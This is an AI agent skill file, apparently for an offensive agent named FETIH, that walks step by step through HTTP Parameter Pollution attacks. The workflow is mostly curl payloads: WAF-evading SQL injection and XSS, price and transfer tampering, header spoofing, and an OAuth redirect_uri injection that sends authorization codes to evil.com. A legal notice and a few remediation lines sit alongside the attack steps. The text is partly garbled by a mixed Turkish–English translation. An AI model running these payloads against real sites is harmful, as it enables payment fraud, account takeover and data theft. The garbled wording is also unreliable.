---
name: performing-http-parameter-pollution-attack
description: Execute HTTP Parameter Pollution attacks to bypass input validation, WAF rules, and security controls by injecting duplicate parameters that are processed differently by front-end and back-end
  systems.
tags:
- server-parsing
- input-validation
- parameter-injection
- web-security
- waf-bypass
- hpp
- fetih
- web-application-security
- cybersecurity
- http-parameter-pollution
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- alert
- api
- attack
- endpoint
- exploit
- http
- log
- parameter
- password
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Performing Http Parameter Pollution Attack


## Ne Zaman Kullanılır
- testing yaparken web applications for input validation bypass vulnerabilities
- During WAF evasion testing to split attack payloads across duplicate parameters
- assessing yaparken how different technology stacks handle duplicate HTTP parameters
- During API security testing to identify parameter precedence issues
- testing yaparken OAuth or payment processing flows for parameter manipulation

## Ön Gereksinimler
- Burp Suite Professional with Intruder and Repeater modules
- Understanding of HTTP protocol and query string parsing
- Bilgi: server-side parameter handling differences (first, last, array, concatenated)
- cURL or httpie for manual parameter crafting
- Target application technology stack identification (Apache, IIS, Tomcat, Node.js, etc.)


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1 — Identify Parameter Handling Behavior
```bash

curl -v "http://target.com/search?q=first&q=second"

curl -X POST http://target.com/api/action \
  -d "amount=100&amount=1"
```

### Adım 2 — Perform Server-Side HPP
```bash
curl "http://target.com/api/user?id=1%20OR%201%3D1"  # Blocked by WAF

curl "http://target.com/api/user?id=1%20OR&id=1%3D1"  # May bypass WAF

curl -X POST http://target.com/transfer \
  -d "to_account=victim&amount=100&to_account=attacker"

curl -X POST http://target.com/api/payment \
  -d "price=99.99&currency=USD&price=0.01"
```

### Adım 3 — Perform Client-Side HPP
```bash

curl "http://target.com/share?url=http://legit.com%26callback=http://evil.com"

curl "http://target.com/redirect?url=http://trusted.com%26token=stolen_value"
```

### Adım 4 — Bypass WAF Rules Using HPP
```bash
curl "http://target.com/search?q=1' UNION&q=SELECT password FROM users--"

curl "http://target.com/search?q=<script>&q=alert(1)</script>"

curl "http://target.com/api/data?filter=admin%26role=superadmin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-For: attacker-ip" \
     http://target.com/api/admin
```

### Adım 5 — Test OAuth and Payment Flow HPP
```bash
curl "http://target.com/oauth/authorize?client_id=legit&redirect_uri=https://legit.com/callback&redirect_uri=https://evil.com/steal"

curl -X POST http://target.com/api/checkout \
  -d "item=product1&price=100&quantity=1&price=1"

curl -X POST http://target.com/api/apply-coupon \
  -d "coupon=SAVE10&coupon=SAVE90&coupon=FREE"
```

### Adım 6 — Automate HPP Testing
```bash

zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
  http://target.com

python3 hpp_tester.py --url http://target.com/api/action \
  --params "id,role,amount" --method POST
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Server-Side HPP | Duplicate parameters processed differently by backend causing logic bypass |
| Client-Side HPP | Injected parameters reflected in URLs/links sent to other users |
| Parameter Precedence | Server behavior: first-wins, last-wins, concatenation, or array |
| WAF Evasion | Splitting attack payloads across duplicate parameters to avoid Tespit |
| Technology-Specific Parsing | Different frameworks handle duplicate parameters uniquely |
| URL Encoding HPP | Using %26 (encoded &) to inject additional parameters within a value |
| Header Pollution | Sending duplicate HTTP headers to exploit forwarding or trust logic |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for intercepting and duplicating parameters |
| param-miner | Burp extension for discovering hidden and duplicate parameters |
| OWASP ZAP | Automated scanner with HPP Tespit capabilities |
| Arjun | Hidden HTTP parameter discovery tool |
| ffuf | Fuzzing tool for parameter brute-forcing and duplication testing |
| Wfuzz | Web application fuzzer supporting parameter manipulation |

## Common Scenarios

1. **WAF Bypass** — Split SQL injection or XSS payloads across duplicate parameters where the WAF Denetle:s values individually but the server concatenates them
2. **Payment Manipulation** — Override price or quantity parameters in e-commerce checkout flows by submitting duplicate parameter values
3. **OAuth Redirect Hijacking** — Inject a duplicate redirect_uri parameter to redirect authorization codes to an attacker-controlled server
4. **Access Control Bypass** — Override role or permission parameters in requests to elevate privileges or access restricted resources
5. **Input Validation Bypass** — Circumvent client-side or server-side validation by injecting unexpected duplicate parameters

## Output Format

```
## HTTP Parameter Pollution Assessment Report
- **Target**: http://target.com
- **Server Technology**: ASP.NET/IIS (concatenation behavior)
- **Vulnerability**: Server-Side HPP in payment endpoint

### Parameter Handling Matrix
| Technology | Behavior | Tested |
|-----------|----------|--------|
| Apache/PHP | Last value | Yes |
| IIS/ASP.NET | Comma-concatenated | Yes |
| Node.js | Array | Yes |

### Bul:ings
| # | Endpoint | Parameter | Impact | Severity |
|---|----------|-----------|--------|----------|
| 1 | POST /checkout | price | Price manipulation | Critical |
| 2 | GET /oauth/authorize | redirect_uri | Token theft | High |
| 3 | POST /api/search | q | WAF bypass (SQLi) | High |

### İyileştirme
- Implement strict parameter validation rejecting duplicate parameters
- Use the first occurrence of any parameter and ignore subsequent duplicates
- Apply WAF rules that tespit etmeduplicate parameter patterns
- Validate all parameters server-side regardless of client-side checks
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 6a481c8590c8ee17
-->

